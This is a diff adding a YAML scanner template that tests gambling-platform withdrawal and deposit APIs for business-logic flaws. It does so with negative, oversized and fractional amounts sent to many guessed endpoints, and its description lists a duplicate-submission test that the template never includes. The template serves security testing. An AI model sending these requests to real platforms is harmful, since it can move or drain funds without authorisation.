@@ -1,0 +1,158 @@
+id: gambling-withdrawal-amount-boundary
+info:
+  name: Gambling Platform - Withdrawal / Deposit Business Logic Flaw
+  author: redsaas-team
+  severity: critical
+  description: |
+    偵測博弈平台出入款 API 的業務邏輯漏洞（OWASP API3）。
+    包含：
+    1. 負數金額提款（帳戶餘額反向增加）
+    2. 超大金額繞過上限
+    3. 浮點精度攻擊（0.000001 * N 累計套利）
+    4. 重複提交同一筆交易（冪等性缺失）
+    全局 Authorization header 由掃描器注入。
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
+  tags: gambling,finance,boundary,withdrawal,deposit,business-logic,owasp-api3
+  metadata:
+    max-request: 20
+
+http:
+  # ── 測試一：負數金額提款
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/withdraw"
+      - "{{BaseURL}}/api/v1/withdraw"
+      - "{{BaseURL}}/api/v1/withdrawal"
+      - "{{BaseURL}}/member/withdrawal"
+      - "{{BaseURL}}/api/finance/withdraw"
+      - "{{BaseURL}}/api/wallet/withdraw"
+      - "{{BaseURL}}/api/cashier/withdraw"
+    headers:
+      Content-Type: "application/json"
+    body: '{"amount":-100,"currency":"TWD","bank_code":"808","account":"1234567890"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "transaction_id"
+          - "transactionId"
+          - "order_id"
+          - "orderId"
+          - "approved"
+          - "pending"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "invalid amount"
+          - "invalid_amount"
+          - "must be positive"
+          - "greater than"
+          - "not allowed"
+          - "error"
+          - "failed"
+          - "金額錯誤"
+          - "不能為負"
+        negative: true
+        condition: or
+
+  # ── 測試二：浮點精度攻擊
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/withdraw"
+      - "{{BaseURL}}/api/v1/withdraw"
+      - "{{BaseURL}}/api/wallet/withdraw"
+    headers:
+      Content-Type: "application/json"
+    body: '{"amount":0.001,"currency":"TWD"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "transaction_id"
+          - "approved"
+        condition: or
+
+  # ── 測試三：出款金額超限
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/withdraw"
+      - "{{BaseURL}}/api/v1/withdraw"
+      - "{{BaseURL}}/api/wallet/withdraw"
+    headers:
+      Content-Type: "application/json"
+    body: '{"amount":9999999999,"currency":"TWD"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "transaction_id"
+          - "approved"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "insufficient"
+          - "exceed"
+          - "limit"
+          - "超出限額"
+          - "餘額不足"
+        negative: true
+        condition: or
+
+  # ── 測試四：入款負數（反向套利）
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/deposit"
+      - "{{BaseURL}}/api/v1/deposit"
+      - "{{BaseURL}}/member/deposit"
+      - "{{BaseURL}}/api/finance/deposit"
+      - "{{BaseURL}}/api/wallet/deposit"
+    headers:
+      Content-Type: "application/json"
+    body: '{"amount":-500,"currency":"TWD","method":"bank_transfer"}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "transaction_id"
+          - "approved"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "invalid"
+          - "error"
+          - "failed"
+          - "not allowed"
+        negative: true
+        condition: or
